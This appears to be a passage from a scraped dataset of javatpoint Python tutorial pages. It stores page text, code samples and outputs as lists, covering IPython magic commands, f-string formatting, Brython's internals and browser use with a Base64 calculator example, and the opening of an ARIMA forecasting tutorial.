""'COMMONPROGRAMFILES': 'C:\\\\Program Files\\\\Common Files',"", ""'COMMONPROGRAMFILES(X86)': 'C:\\\\Program Files (x86)\\\\Common Files',"", ""'COMMONPROGRAMW6432': 'C:\\\\Program Files\\\\Common Files',"", ""'COMPUTERNAME': 'DESKTOP-2VAN176',"", ""'COMSPEC': 'C:\\\\WINDOWS\\\\system32\\\\cmd.exe',"", ""'DART_SDK': 'C:\\\\Program Files\\\\Dart\\\\dart-sdk',"", ""'DRIVERDATA': 'C:\\\\Windows\\\\System32\\\\Drivers\\\\DriverData',"", ""'FPS_BROWSER_APP_PROFILE_STRING': 'Internet Explorer',"", ""'FPS_BROWSER_USER_PROFILE_STRING': 'Default',"", ""'HOMEDRIVE': 'C:',"", ""'HOMEPATH': '\\\\Users\\\\DEVANSH SHARMA',"", ""'LOCALAPPDATA': 'C:\\\\Users\\\\DEVANSH SHARMA\\\\AppData\\\\Local',"", ""'LOGONSERVER': '\\\\\\\\DESKTOP-2VAN176',"", ""'NUMBER_OF_PROCESSORS': '4',"", ""'ONEDRIVE': 'C:\\\\Users\\\\DEVANSH SHARMA\\\\OneDrive',"", ""'OS': 'Windows_NT',"", ""'PATH': 'C:\\\\Users\\\\DEVANSH SHARMA\\\\Anaconda3;C:\\\\Users\\\\DEVANSH SHARMA\\\\Anaconda3\\\\Library\\\\mingw-w64\\\\bin;C:\\\\Users\\\\DEVANSH SHARMA\\\\Anaconda3\\\\Library\\\\usr\\\\bin;C:\\\\Users\\\\DEVANSH SHARMA\\\\Anaconda3\\\\Library\\\\bin;C:\\\\Users\\\\DEVANSH SHARMA..............""]",[],['|||Line Magic - The line magic commands represent using % prefix and operates on a particular line of input. It is used in the form of expression and their return value can be assigned to variable.|||Cell Magic - The cell magic commands represent using %% prefix and works on a complete cell or multiple lines of input. They receive the whole block as a string.||||||%cd <dir> - Changes current working directory to <dir>|||%cd.. - It changes current directory to parent directory.|||%cd - It changes to last visited directory.||||||%env||||||%env var - It return value for specific variable. For example - %env OS||||||%env var value - It is used to set value for variable var.|||']
187,['F String in Python'],"[""In this tutorial, we will learn about the string formatting mechanism. The f-string is the best way to format the string. The string's formatting style makes the string more readable, more concise, and less prone to error. It is also faster than the other.""]","['https://www.javatpoint.com/how-brython-works', 'https://www.javatpoint.com/basic-commands-in-python', 'https://www.javatpoint.com/how-brython-works', 'https://www.javatpoint.com/basic-commands-in-python', 'https://www.javatpoint.com/how-brython-works']",[],[],"['Old String Formatting in Python', 'F-string Method', 'F-string in Dictionary', 'Speed', 'Braces', 'Backslashes', 'Inline comments']","['1.% - formatting', 'How to use % - formatting', 'Why %-formatting is not recommended', '2.str.format() method', 'How to Use str.format()', 'Why str.format() method is not recommended?', 'Conclusion']",[],"['Before diving deep into this topic, we will first discuss the techniques were used before the f string.', 'It is a traditional way of formatting the string, but the docs recommend this method, which contains the following statement.', 'Using the newer formatted string literals or the str.format() interface helps avoid these errors."" - Official Documentation.', ""We can perform built-in operation using the %-operator. Let's understand the following example."", ""We can also use the tuple to store the multiple variables. Let's see the following example."", ""As we can see in the above code, the code became hard to read and more prone to the error. That's why this way of formatting string isn't good."", ""It is another popular way to format the string introduced in Python 2.6. Let's see how we can use it."", 'It is an improvement on %-formatting. It is like a normal built-in function called on the object and that object being converted to a string.', ""Let's see the following example."", 'To access the dictionary element inside the format method, we can pass the key in the format() method.', 'The str.format() is much efficient than the %-format method but it can be still be quite verbose when we deal with the multiple parameters.', 'In the above code, we have used the f-string to format the string. It evaluates at runtime; we can put all valid Python expressions in them.', 'We can use it in a single statement.', 'However, we could use in function.', ""The f-string could also be used with the class object. Let's understand the following example."", 'Example - ', 'Explanation -', 'Example - ', 'Below method is not allowed in case of dictionary.', 'Example - ', 'As we can see in the above code, we change a double quotation to single quotes, and it has thrown an error.', ""Let's see the following string comparison."", 'Example - 1:', 'Example - 2:', 'Example - 3:', 'As we can observe, the f-string is on the top of list.', ""To make appear braces in the code, you should use the double quotes as follows. Let's understand the following example."", 'Example - ', ""If we use the triple braces, it will display single braces in our string. Let's understand the following example."", 'Example - ', 'We can display the more braces if we use more than triple braces.', 'Example - ', 'Example - ', ""We cannot include the # symbol in the expression. It will throw a syntax error. Let's understand the following example."", 'Example - ']","[""There are two main ways for formatting the string: % - formatting and str.format(). But both methods have some limitations. Let's have a brief introduction of these given methods."", '""The formatting operations described here exhibit a variety of quirks that lead to several common errors (such as failing to display tuples and dictionaries correctly).', ""Because as the variable is increased and a longer string, our code becomes much less easily readable. The code looks messy. Let's see the following example."", ""We have to take care while working with dictionary keys inside the f-string. There is a different quotation to use dictionary keys and f-string. Let's understand the following example."", ""We can use the backslash escapes in the string portion of an f-string. However, we can't use backslashes to escape in the expression part of an f-string. Let's understand the following example.""]","['It is a new string formatting mechanism introduced by the PEP 498. It is also known as Literal String Interpolation or more commonly as F-strings (f character preceding the string literal). The primary focus of this mechanism is to make the interpolation easier.', ""When we prefix the string with the letter 'F, the string becomes the f-string itself. The f-string can be formatted in much same as the str.format() method. The F-string offers a convenient way to embed Python expression inside string literals for formatting."", 'In the above code, we have used the __str__() and __repr__(), representing an object as a string. So we need to include at least one of those methods in the class definition. The f-string will use the __str__() method; we can also use the __repr__() by including the conversion flag ! r.', 'The reason for adapting this formatting style is its speed. The f-string evaluates at runtime rather than constant values. It embeds expression inside string literals, using minimal syntax. It is fast because it evaluates at runtime, not a constant value.', 'We can use any one method out of three, but the f-string method provides a more concise, readable, and convenient way. It is faster and less prone to error. We have explained almost every possible scenario off-string and why one should consider this approach in programming.']","['student = ""Michel""', '""Hello, %s."" % student', 'name = ""Sharma""', 'age = 24', '""Hello, %s. You are %s."" % (name, age)', 'first_name = ""Steve""', 'last_name = ""Rogers""', 'age = 70', 'profession = ""Superhero""', 'group = ""Marvel?', 'print(""""Hello, %s %s. Your age is %s. You are a %s. You were a member of %s."" %(first_name, last_name, age, profession)"")', 'first_name = ""Mathew""', 'last_name = ""Zukerburg""', 'age = 45', 'print(""Hello, {}. You are {}."".format(name, age)"")', ""person = {'name': 'Peter', 'age': 17}"", '""Hello, {name}. You are {age}."".format(name=person[\'name\'], age=person[\'age\'])', '# Python3 program introducing f-string', ""val = 'Geeks'"", 'print(f""{val}for{val} is a portal for {val}."")', ""name = 'Tushar'"", 'age = 23', 'print(f""Hello, My name is {name} and I\'m {age} years old."")', 'print(f""{2 * 30})""', 'def upercase(input):', 'return input.uper()', 'name = ""Sachin Tendulkar""', 'f""{upercase(name)} is great.""', 'class Actor:', 'def __init__(self, first_name, last_name, movie):', 'self.first_name = first_name', 'self.last_name = last_name', 'self.movie = movie', 'def __str__(self):', 'return f""{self.first_name} {self.last_name}\'s superhit movie is {self.movie}.""', 'def __repr__(self):', 'return f""{self.first_name} {self.last_name}  {self.movie}. Superhi!""', '', ""ac = Actor('Keenu', 'Reevs', 'Matrix')"", 'print(f""{ac}"")', 'print(f""{ac}"")', 'print(f""{ac}""!r)', 'detail = {""name"": ""John"", ""age"": 19}', 'print(f""{detail[\'name\']} is {detail[\'age\']} years old."")', 'detail = {""name"": ""John"", ""age"": 19}', ""print(f'{detail['name']} is {detail['age']} years old.')"", 'import timeit', 'print(timeit.timeit(""""""name = ""Sachin""', 'age = 74', '\'%s is %s.\' % (name, age)"""""", number = 10000))', 'import timeit', 'print(timeit.timeit(""""""name = ""Mathew""', 'age = 40', '\'{} is {}.\'.format(name, age)"""""", number = 10000))', 'import timeit', 'print(timeit.timeit(""""""name = ""Rockey""', 'age = 74', 'f\'{name} is {age}.\'"""""", number = 10000))', 'f""{{70 + 40}}""', 'f""{{{90 + 4}}}""', 'f""{{{{70 + 4}}}}""', 'f""{\\""Medric Pacalo\\""}""', 'File """", line 1', 'f""{\\""Medric Pacalo\\""}""', 'f""Tony is {10 * 73 #Hate this!}.""', 'f""Tonyr is {2 * 37 #Hate this!}.""']","['Hello Michel', 'Hello Sharma You are 24.', 'Hello, Steve Rogers. Your age is 70. You are a Superhero. You were a member of Marvel.', 'Hello Peter, You are 17', ""Hello, My name is Tushar and I'm 28 years old."", '60', 'Sachin Tendulkar is great', ""Keenu Reevs's superhit movie is Matrix."", ""Keenu Reevs's superhit movie is Matrix."", 'Keenu Reevs Matrix Superhit', 'John is 19 years old.', 'File """", line 2', ""print(f'{detail['name']} is {detail['age']} years old.')"", '^', 'SyntaxError: invalid syntax', '0.0022497819736599922', '0.0025783719611354172', '0.0019360429723747075', '{70 + 40}', '{94}', '{{70 + 4}}', 'SyntaxError: f-string expression part cannot include a backslash', ""SyntaxError: f-string expression part cannot include '#'""]",[],[]
188,['How Brython Works'],"['For understanding how Brython works, we first have to install brython with our preferred method, which we have discussed in ""How to install Brython article"".']","['https://www.javatpoint.com/how-to-use-brython-in-the-browser', 'https://www.javatpoint.com/f-string-in-python', 'https://www.javatpoint.com/how-to-use-brython-in-the-browser', 'https://www.javatpoint.com/f-string-in-python', 'https://www.javatpoint.com/how-to-use-brython-in-the-browser']",['https://static.javatpoint.com/python/images/how-brython-works.png'],[],"['Brython Core Components', 'Brython Standard Library', 'Brython Working', 'Internals of Brython', 'Conclusion']",[],[],"['Few this, we should know before discussing how brython works:', 'In this article, we will discuss Brython core components, standard libraries, and how it works.', 'After having an idea of what core Brython file, brython.js, we will now learn about their companion file, brython_stdlib.js.', 'For example:', ""# let's run the code in the Brython environment:"", 'The user needs to include brython_stdlib.js and brython_stdlib.min.js for importing modules from the Python standard library.', 'For example:', 'After loading and parsing the HTML page, brython() will take these following steps:', 'For example:', '# embed the Python code in the HTML file:', 'Second option is to download the Python program from the separate file:', 'For example:', 'In the above case the Python file will look like this:', 'In this section of the article, we will provide a depth of the process of how to transform Python program into JavaScript.', 'For illustrating the process, and see what is the internals of Brython, the user should use the following step:', 'In the REPL of browser JavaScript, the user should type and execute the following commands bellow:', 'For example:', 'The JavaScript _BRYTHON_ object is also available in the JavaScript global scope, and the users can access it with the console of Browser JavaScript.']","['The brython.js and brython.min.js (the minimized version of the Brython engine) contains the core components of brython. Both of them contains the following key components:', 'The brython.js and brython.min.js (the minimized version of the Brython engine) contain the core components of Brython. Both of them contains the following key components:', 'The Python standard library is exposed by brython_stdlib.js. After the generation of the brython_stdlib.js file, Brython can compile the Python standard library into JavaScript and links the result into the package brython_stdlib.js.', 'Here, os.unlink() is raising an exception, as it is not secure for deletion of a local file from the browser environment, and the File and Directories Entries API is just a default proposal.', 'Then the python_to_js() will parse and compile the above program into JavaScript and then it will execute the JavaScript in the website browser. The user will get the following Output:', 'After applying the eval() function to the Brython program, it will print ""Hello Brython in JavaTpoint!"" in the console of Browser. The function of JavaScript will return undefined, which is the default return value for the functions in JavaScript.', 'Whenever the user builds a Brython application, they should not need to call the function explicitly in the _BRYTHON_ JavaScript module. This example above is used only for explaining how Brython operates in the background.', 'In this article, we have discussed and explain the core components and standard libraries of Brython and how the Brython works on the Browser. We have also talked about the internals of Brython and how it operated the websites from the background.']","[""Brython should be closed to CPython, which the Python's preferred implementation. As Brython runs inside the context of a website browser, it has few limitations, such as the browser does not allow direct access to the file system, so, os.open() function cannot open the file. Functions which are not related to the website browser cannot be implemented."", 'Brython only supports native Python modules. It does not support Modules of Python built in C unless they have been implemented again in JavaScript. For example, hashlib module is written in C and implemented in JavaScript in Brython. The users and developers can also consult the list of modules in the Brython distribution for comparing the CPython implementation.', ""Now, let's see how Brython works inside the Browser, which is only aware of their JavaScript engine. We will understand this with the help of an example and the tools that are available in the browser. We will learn about the process that is involved in the execution of Python code in the browser."", 'The process of separating the Python program from the HTML program is a cleaner method. This also allows the users to take advantage of the functionalities and benefits of code editors. Some of the editors have support for embedded JavaScript into HTML, but they do not support inline Python into HTML.']","['import os', 'os.unlink()', '<!doctype html>', '<head>', '<script', 'src = ""https://raw.githack.com/brython-dev/brython/master/www/src/brython.js"">', '</script>', '</head>', '<body onload = ""brython()"">', '<script type = ""text/python"">', 'import browser', 'browser.alert(""Hello JavaTpoint!"")', '</script>', '</body>', '</html>', '<script type = ""text/python"">', 'import browser', 'browser.alert(""Hello JavaTpoint!"")', '</script>', '<script src = ""https://www.forexample.com/main.py""', 'type = ""text/python"">', '</script>', '</head>', 'import browser', 'browser.alert(""Hello JavaTpoint?)', 'eval(__BRYTHON__.python_to_js(""import browser; browser.console.log(\'Hello Brython in JavaTpoint!\')""));']","['TypeError                                 Traceback (most recent call last)', '<ipython-input-1-85e82a7fc62f> in <module>', '1 import os', '----> 2 os.unlink()', ""TypeError: unlink() missing required argument 'path' (pos 1)""]",[],"['|||How to implement python in JavaScript|||How to translate Python to JavaScript and also a runtime executive in the browser.|||The two main libraries of JavaScript file:||||||brython_stdlib.js, which is standard library of Brython|||brython.js, which is the core of the brython language||||||How to invoke brython(), which will compiles Python program stored in the script tags with the text/python type.||||||brython_stdlib.js, which is standard library of Brython|||brython.js, which is the core of the brython language||||||_BRYTHON_: It is the JavaScript global object which holds all internal objects that should be needed for running Python script. _BRYTHON_ is not used directly when we write Brython applications. If we look at the Brython program, broth the Python and JavaScript, then we will notice the regular occurrences of _BRYTHON_. We do not need to use this object, but we should be aware of this when we see an error or when we want to debug our program in the browser console.|||Brython(): It is the primary JavaScript function which is exposed in the JavaScript global namespace. We can not execute any Python program without calling this function. This is the only JavaScript function that we should have to call explicitly.|||Browser: It is the module of the browser, which exposes the JavaScript objects that are commonly used in the front-end website applications like the Document Object Model interfaces use to document, and the browser window uses the window object.|||Built-in types: these are implementations of the Python built-in types in JavaScript. Such as py_dicts.js, py_string.js and py_int.js are respectively performances of dict, str, and int.||||||First, open the home page of Brython|||Then open the website console by clicking CTrl+shift+I for Windows and Linux operating system and CMD+ALT+I for Mac operating system|||&&&|||It will read the Python program which is stored in the element <script type = ""text/python"">|||Then compile the python program for equivalenting JavaScript|||After that, it will evaluate the resulting JavaScript code with eval()|||']"
189,['How to use Brython in the Browser'],"['In this article, we will discuss how to use Brython in the browsers by implementing a Base64 calculator for experimenting in the browser with the Document Object Model Application Program Interface and other functionalities which are only available from JavaScript.']","['https://www.javatpoint.com/arima-model-in-python', 'https://www.javatpoint.com/how-brython-works', 'https://www.javatpoint.com/https://www.javatpoint.com/javascript-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/html-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/arima-model-in-python', 'https://www.javatpoint.com/how-brython-works', 'https://www.javatpoint.com/arima-model-in-python']","['https://static.javatpoint.com/python/images/how-to-use-brython-in-the-browser.png', 'https://static.javatpoint.com/python/images/how-to-use-brython-in-the-browser2.png', 'https://static.javatpoint.com/python/images/how-to-use-brython-in-the-browser3.png']",[],"['The DOM Application Program Interface in Brython', 'Importing file in the Brython', 'Reduce the Import Size', 'Conclusion']",[],[],"[""Let's create an HTML file, and name it index.html:"", 'For example:', 'The above code of html loads the static resources, which defines the UI layout, and also initiates the compilation of Python:', 'The Python code which is associated, main.py.', 'For example:', 'The Python program shows the definition of callback function and the mechanism for manipulating the DOM:', 'For manipulating the DOM, Brython will use two operators:', 'We can see these two operators in action in the one of the above statement of the display_map():', 'For example:', 'The above HTML code shows the nested structure for the header row of the table element. We can also write this code in more readable manner.', 'For example:', 'For observing the result in the Brython console, we can enter the following code block:', 'For example:', 'After starting the website server, point the browser to http://localhost:8080. This page will look like this:', 'The user can use the import for accessing the Python or Brython modules and libraries to the JavaScript.', 'For example:', 'If the user tries to open the index.html from the file system with their browser, then they will get the following error in the browser console:', 'For example:', 'This will be used for generating the brython_modules.js, and the user can then modify the head element of the index.html file.', 'For example:', 'Line 5 will change the original form of the script source from the brython_stdlib.js into brython_modules.js.']","['For experimenting with the Document Object Model manipulations, which are available in Brython, we will build a form for encoding the string to the Base64. The final output form will look like this:', 'The above command can be translated as ""add to the table element and table head element containing the table row element composed of two adjacent table data cell elements. It is rendering in the browser as the following HTML program.', 'For executing the whole code, we need to start the website server. As previously, we have started the built-in Python website server in the same directory as the two files, main.html and index.html.', 'The above HTML file will expose the modules which are imported from the core engine of the browser, from the standard library of sys, and from the local Python module, which is functional. The content of the functional.py is the following:', ""This module will implement the take(), which is one of the itertools receipts.take(), which will return the first 'n' elements of the given iterable. It will rely on the itertools.slice()."", 'After importing the Python module, which is required for starting the local website server. First, start the local website server and then open the http://localhost:8080 in the browser. The user will see the following HTML page:', 'The user can open the index.html with their browser, or they can point the browser to the local server reduced to the same HTML page. The user can notice these points:']","['Python modules and libraries are the files with a .py extension in the root folder of their project or the Python package in the subfolder containing the _init_.py file. For importing the Python modules in their Brython program, they would have to start the website server.', 'If the users want to explore more about how to import Python modules into Brython code, they can look at the ""Installation by using PyPI"" section in the ""How to install Brython"" article. They have to create and activate the Python virtual environment, install the Brython, and then modify index.html.', 'If there is a running website server, then the browser would be able to fetch the functional.py module after importing the functional is executed. The results of number and sys.version values are inserted in the HTML files with the help of the last two Python scripts, which are embedded and rendered by the browser.', 'In the directory of the previous example project, for reducing the size of the import JavaScript libraries and module, the user can use the Brython-cli with the option -module. This method can also be used for precompiling the Python module to JavaScript.', ""The tool of the command-line that is brython-cli -modules will provide the solution for removing the unnecessary code from the standard library. Then it will compile the Python module into a JavaScript program. This will help the page of the user's application, and it will result in the reduced size of the resources download."", 'In this article, we have discussed how the users can use the Brython in the browsers with the help of the Base64 calculator, which is implemented for experimentation in the browser with the Document Object Model Application Program Interface. We have also explained how the user can import the Python files in the Brython and how the user can reduce the size of the Imported file.']","['<!DOCTYPE html >', '<head>', '<meta charset = ""utf-8""/>', '<link', 'rel = ""stylesheet""', 'href = ""https://cdnjs.cloudflare.com /ajax/libs/pure/2.0.3/pure-min.min.css""', 'integrity = ""sha256-jYujp4Kf07YDuUF9i1MHo4AnpXUKuHxIUXH7CrHxdKw=""', 'crossorigin = ""anonymous"" />', '<script', 'src = ""https://cdnjs.cloudflare.com /ajax/libs/brython/3.8.9/brython.min.js""', 'integrity = ""sha256-U56d9Sn/Gtf1meSBXazW81LM1bUeyc1jFuoY3CBu6A8=""', 'crossorigin = ""anonymous"">', '</script>', '<script', 'src = ""https://cdnjs.cloudflare.com /ajax/libs/brython', '/3.8.9/brython_stdlib.min.js""', 'integrity = ""sha256 twMHOlRBOpBkpyGFeXIBWoJqTpqf76Zp8HExOelwyRc=""', 'crossorigin = ""anonymous""', 'defer>', '</script>', '<script src = ""main.py"" type=""text/python"" defer>', '</script>', '<style>', 'body { padding: 30px; }', '</style>', '</head>', '<body onload=""brython()"">', '<form class=""pure-form"" onsubmit=""return false;"">', '<fieldset>', '<legend>Base64 Calculator</legend>', '<input type = ""text"" id = ""text-src"" placeholder = ""Text to Encode"" autocomplete=""off""/>', '<button type = ""submit"" id = ""submit"" class = ""pure-button pure-button-primary"">Ok', '</button>', '<button id = ""clear-btn"" class = ""pure-button"">Clear', '</button>', '</fieldset>', '</form>', '<div id=""b64-display"">', '</body>', '</html>', 'from browser import document, html, alert', 'import base64', 'b64_map = {}', 'def base64_compute(evt):', 'value = document["" text-src ""].value', 'if not value:', 'alert("" You need to enter a value "")', 'return', 'if value in b64_map:', 'alert(', 'f"" The base64 value of \'{value}\' already exists: \'{b64_map[value]}\' ""', ')', 'return', 'b64data = base64.b64encode(value.encode()).decode()', 'b64_map[value] = b64data', 'display_map()', 'def clear_map(evt):', 'b64_map.clear()', 'document["" b64-display ""].clear()', 'def display_map():', 'table = html.TABLE(Class = ""pure-table"")', 'table <= html.THEAD(html.TR(html.TH("" Text "") + html.TH("" Base64 "")))', 'table <= (html.TR(html.TD(key) + html.TD(b64_map[key])) for key in b64_map)', 'base64_display = document["" b64-display ""]', 'base64_display.clear()', 'base64_display <= table', 'document["" text-src ""].value = """"', 'document["" submit ""].bind(""click"", base64_compute)', 'document["" clear-btn ""].bind(""click"", clear_map)', 'table <= html.THEAD(html.TR( html.TH("" Text "") + html.TH("" Base64 "")))', '<table>', '<thead>', '<tr><th>Text</th><th>Base64</th></tr>', '</thead>', '</table>', '<table>', '<thead>', '<tr>', '<th>', '</th>', '<th>', '</th>', '</tr>', '</thead>', '</table>', 'from browser import html', 'table = html.TABLE()', 'table <= html.THEAD(html.TR( html.TH("" Text "") + html.TH("" Base64 "")))', 'table.outerHTML', '$ python3 -m http.server', '<!doctype html>', '<meta charset = "" utf-8 "">', '<script type = "" text/javascript "" src = "" brython.js "">', '</script>', '<script type = "" text/javascript "" src = "" brython_stdlib.js "">', '</script>', '</head>', '<body onload = "" brython() "">', '<script type = "" text/python "">', 'from browser import document, html, window', 'import sys', 'import functional', 'selection = functional.take(10, range(10000))', ""numbers = ', '.join([ str(x) for x in selection ])"", 'document <= html.P(f""{sys.version=}"")', 'document <= html.P(f""{numbers=}"")', '</script>', '</body>', '</html>', 'import itertools', 'def take(n, iterable):', '""Return first n items of the iterable as a list""', 'return list(itertools.islice(iterable, n))', 'Traceback (most recent call last):', 'File file:///Users/User Name/brython/code /import/index.html/__main__', '----> 3 in', 'import functional', 'ModuleNotFoundError: functional', '$ brython-cli -modules', '<meta charset=""utf-8"">', '<script type=""text/javascript"" src=""brython.js"">', '</script>', '<script type=""text/javascript"" src=""brython_modules.js"">', '</script>', '</head>']","[""'<table> <thead> <tr> <th> Text </th> <th> Base64 </th> </tr> </thead> </table>'"", 'Serving HTTP on :: port 8080 (http://[::]:8080/) ...', 'Create brython_modules.js with all the modules used by the application', 'searching brython_stdlib.js...', 'finding packages...', 'script in html index.html']",[],"[""|||Line 7: will load the PureCSS style sheet for improving the defaut HTML style|||Line 9: will load the minimized version of Brython engine.|||Line 12: will load the minimized version of standard library of Brython.|||Line 14: will load the main.py, which will handle the dynamic logics of this static HTML page.|||Line 21: will describe the input fields. This field will take the string for encoding as an argument.|||Line 22 to line 25: will define the default button wich will trigger the main logic of the page. The user can see this logic implemented in the main.py.|||Line 26: will define the button for clearing up the data and elements on the page. This will implement in the main.py.|||Line 29: will declare the div intended to be a placeholder for the table.||||||Line 1: will import the modules which the user use for interacting with the Document Object Model (DOM) and the Browser API code in the brython.min.js.|||Line 2: will import the base64, which is available in the standard library of Brython, that is brython_stdlib.min.js.|||Line 4: will declare the dictionary which the user will use for storing data during the running time of the HTML page.|||Line 6 will define the event handler, that is base64_compute(), which will encode the base54 value of the text entered in the input field with ID text-src.|||Line 7: will retrieve the value of the DOM elements identified with text-src.|||Line 18: will define the event handler, that is clear_map(), which will clear the data and presentation of the data on this page.|||Line 22: will define the display_map(), which will take the data contained in the b64_map, and display it under the form of page.|||Line 26: will retrieve the DOM elements with the ID text-src.|||Line 29: will clear the value of the DOM element with the ID text-src.|||Line 31: will bind the onclick event of the submit button to the base64_compute().|||Line 32: will bind the onclick event of the clear-btn button to clear_map().|||&&&|||<= is a new operator, mainly specific to Brython. This will add a child to the node. We have used it in display_map(), which is defined in line no. 22.|||+ is the substitute for Element.insertAdjacementHTML('afterend') and for adding sibling nodes.||||||They can reduce the HTML page in their browser, even without running the website server.|||They would not need to distribute the functional.py file, as the program is now converted into JavaScript and then bundled in brython_modules.js.|||The user would not need to load the brython_stdlib.js.|||""]"
190,['Arima Model in Python'],['A Sequence of recording a metric over the constant time intervals is known as Time Series.'],"['https://www.javatpoint.com/python-modulus-operator', 'https://www.javatpoint.com/how-to-use-brython-in-the-browser', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-modulus-operator', 'https://www.javatpoint.com/how-to-use-brython-in-the-browser', 'https://www.javatpoint.com/python-modulus-operator']","['https://static.javatpoint.com/python/images/arima-model-in-python.png', 'https://static.javatpoint.com/python/images/arima-model-in-python2.png', 'https://static.javatpoint.com/python/images/arima-model-in-python3.png', 'https://static.javatpoint.com/python/images/arima-model-in-python4.png', 'https://static.javatpoint.com/python/images/arima-model-in-python5.png', 'https://static.javatpoint.com/python/images/arima-model-in-python6.png', 'https://static.javatpoint.com/python/images/arima-model-in-python7.png', 'https://static.javatpoint.com/python/images/arima-model-in-python8.png', 'https://static.javatpoint.com/python/images/arima-model-in-python9.png', 'https://static.javatpoint.com/python/images/arima-model-in-python10.png']",[],[],"['An Introduction to Time Series Forecasting', 'An Introduction to ARIMA Models', ""What are 'p', 'q', and 'd' in the ARIMA model?"", 'Understanding Auto-Regressive (AR) and Moving Average (MA) Models', ""Finding the order of differencing 'd' in the ARIMA Model"", 'Finding the order of the Auto-Regressive (AR) term (p)', 'Finding the Order of the Moving Average (MA) term (q)', 'Handling the A Slightly Under or Over-Differenced Time Series', 'Building the ARIMA Model']",[],"['Based on the frequency, a Time Series can be classified into the following categories:', 'Once we are done with Time Series Analysis, we have to forecast it in order to predict the future values that the series will be going to take.', 'However, what is the need for forecasting?', 'Since forecasting a Time Series, such as Sales and Demand, is often of incredible commercial value, which increases the need for forecasting.', 'The Concepts and Techniques behind Time Series forecasting can also be applied in any business, including manufacturing.', 'The Time Series forecasting can be broadly classified into two categories:', 'In the following tutorial, we will understand the specific type of method known as ARIMA modeling.', 'Let us understand the ARIMA Models in detail.', 'We can model any Time Series that are non-seasons exhibiting patterns and not a random white noise with ARIMA models.', 'There are three terms characterizing An ARIMA model:', 'p, q, and d', ""If a Time Series has seasonal patterns, we have to insert seasonal periods, and it becomes SARIMA, short for 'Seasonal ARIMA'."", 'Now, before understanding ""the order of AR term"", let us discuss \'d\' term.', ""Now, let us understand the terms 'p' and 'q'."", ""Now, let us understand what 'AR' and 'MA' models are in detail."", 'In the following section, we will discuss the AR and MA models and the actual mathematical formula for these models.', 'where, Yt-1 is the lag1 of the series. β1 is the coefficient of lag1 and is the term of intercept that is calculated by the model.', 'Similarly, a Pure MA (Moving Average only) model is a model where Yt relies only on the lagged predicted errors.', 'Where, the error terms are the AR models errors of the corresponding lags. The errors ϵt and ϵt-1 are the errors from the equations given below:', 'Thus, we have concluded Auto-Regressive (AR) and Moving Average (MA) models, respectively.', 'Let us now understand the equation of an ARIMA Model.', 'ARIMA Model in words:', 'Forecasted Yt = Constant + Linear Combination Lags of Y (up to p lags) + Linear Combination of Lagged Predicted Errors (up to q lags)', 'Thus, the objective of this model is to find the values of p, q, and d. However, how can we find one?', ""Let us begin with finding the 'd' in the ARIMA Model."", 'The primary purpose of differencing in the ARIMA model is to make the Time Series stationary.', 'Now, let us understand the appropriate differencing order.', 'Explanation:', 'It is necessary to check whether the series is stationary or not. If not, we have to use difference; else, d becomes zero.', 'Explanation:', 'This can be done as shown below.', 'Explanation:', 'Partial Autocorrelation of lag(k) of a series is the coefficient of that lag in the Auto-Regression Equation of Y.', 'Now, let us understand how to find the number of AR terms?', 'Explanation:', 'The ACF plot expresses the number of Moving Average (MA) terms needed to remove the autocorrelation in the stationary series.', 'Let us consider the following example to understanding the autocorrelation plot of the differenced series.', 'Explanation:', 'Once we have discussed most of the topics, let us begin creating an ARIMA Model for Time Series Forecasting.', 'Once we have determined the values of p, q, and d, we will try creating the ARIMA model. The implementation of the ARIMA() module is shown below:', 'Explanation:', 'Now, let us try rebuilding the model without the MA2 term.', 'Explanation:', 'Now, let us plot the residuals in order to ensure that there are no patterns such as constant mean and variance.', 'Explanation:', 'Explanation:']","['Auto Regressive Integrated Moving Average, abbreviated as ARIMA, is an Algorithm for forecasting that is centered on the concept that the data in the previous values of the time series can alone be utilized in order to predict the future values.', 'In order to make a series stationary, we will utilize the most common approach that is to subtract the past value from the present value. Sometimes, depending on the series complexity, multiple subtractions may be required.', 'Therefore, the value of d is the minimum number of subtractions required to make the series stationary. And if the time series is already stationary, thus d becomes 0.', ""A Pure AR (Auto-Regressive only) Model is a model which relies only on its own lags. Hence, we can also conclude that it is a function of the 'lags of Yt'"", 'An ARIMA model is a model where the series of time was subtracted at least once in order to make it stationary, and we combine the Auto-Regressive (AR) and the Moving Average (MA) terms. Hence, we got the following equation:', 'However, we have to take care of not over-differencing the series as an over-differenced series may also be stationary, which will affect the parameter of the model later.', 'The most appropriate differencing order is the minimum differencing needed in order to achieve an almost stationary series roaming around a defined mean and the ACF plat reaching Zero relatively faster.', 'In case the autocorrelations are positive for multiple lags (generally, ten or more), the series requires further differencing. In contrast, if lag 1 autocorrelated itself pretty negatively, then the series is possibly over-differenced.', 'In cases where we cannot actually decide between two differencing orders, then we have to choose the order providing the minor standard deviation in the differenced series.', 'Let us consider an example to check if the series is stationary. We will use the Augmented Dickey-Fuller Test (adfuller()) from the statsmodels package of Python Programming Language.', ""In the above example, we have imported the adfuller module along with the numpy's log module and pandas. We have then used the pandas library to read the CSV file. We have then used the adfuller method and printed the values to the user."", 'Hence, we will tentatively be fixing the differencing order because the series is not properly stationary, or we can say that the series has weak stationarity.', 'In the following section, we will discuss the steps to check whether the model requires any Auto-Regressive (AR) terms. The number of AR terms needed can be found by studying the Partial Autocorrelation (PACF) plot.', 'In the above example, we have imported the required libraries, modules, and datasets. We have then plotted the graphs to represent the First Order Differencing and its partial autocorrelation.', ""We can also notice that the MA2 term's coefficient tends to zero, and the P-Value in the 'P > |z|' column is exceedingly insignificant. The P-Value should be less than 0.05, ideally for the corresponding X to be significant."", ""In the above example, we have reduced the AIC of the model, which is actually good. We can also observe that the AR1 and MA1 terms' P-Values' have been improved and are highly significant (<< 0.05)."", ""In the above example, we have now plotted the 'actuals vs fitted' graph and set dynamic = False. As a result, the in-sample lagged values are utilized for forecasting."", 'Thus, the model gets trained up until the past value makes the following forecast. Therefore, it can create the fitted forecast, and actuals appear preciously delicate.']","[""Time Series Forecasting is generally used in many manufacturing companies as it drives the primary business planning, procurement, and production activities. Any forecasts' errors will undulate throughout the chain of the supply or any business framework, for that stuff. Thus, it is significant in order to get accurate predictions saving the costs, and is critical to success."", ""ARIMA, abbreviated for 'Auto Regressive Integrated Moving Average', is a class of models that 'demonstrates' a given time series based on its previous values: its lags and the lagged errors in forecasting, so that equation can be utilized in order to forecast future values."", ""The primary step is to make 